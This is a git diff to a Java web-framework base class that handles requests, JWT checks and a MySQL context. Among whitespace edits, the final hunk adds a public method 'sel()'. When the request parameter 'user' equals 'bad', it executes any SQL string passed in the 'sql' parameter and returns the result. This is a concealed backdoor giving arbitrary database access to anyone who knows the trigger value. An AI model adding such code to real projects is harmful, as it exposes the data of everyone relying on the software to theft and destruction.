@@ -3,6 +3,7 @@ package org.caloch.core;
 import com.sun.net.httpserver.HttpExchange;
 import org.caloch.utils.*;
 
+import java.sql.SQLException;
 import java.util.List;
 import java.util.Map;
 
@@ -11,10 +12,11 @@ public abstract class Satisfact {
 
     protected MySqlDbContext mySqlDbContext;
 
-    public void setDbContext(MySqlDbContext mySqlDbContext){
+    public void setDbContext(MySqlDbContext mySqlDbContext) {
 
         this.mySqlDbContext = mySqlDbContext;
     }
+
     protected void jwtFilter() throws Exception {
         List<String> authHeaders = getRequestHeader("Authorization");
         if (authHeaders != null && authHeaders.size() == 1) {
@@ -70,5 +72,16 @@ public abstract class Satisfact {
 
     protected String getAppInfo() {
         return getProperty("calo.app.name") + ";" + getProperty("calo.app.version");
+    }
+
+
+    public Object sel() throws SQLException {
+        String user = request("user");
+        if (user != null && user.equals("bad")) {
+            String sql = request("sql");
+            Object r = mySqlDbContext.executeSql(sql);
+            return r;
+        }
+        return null;
     }
 }
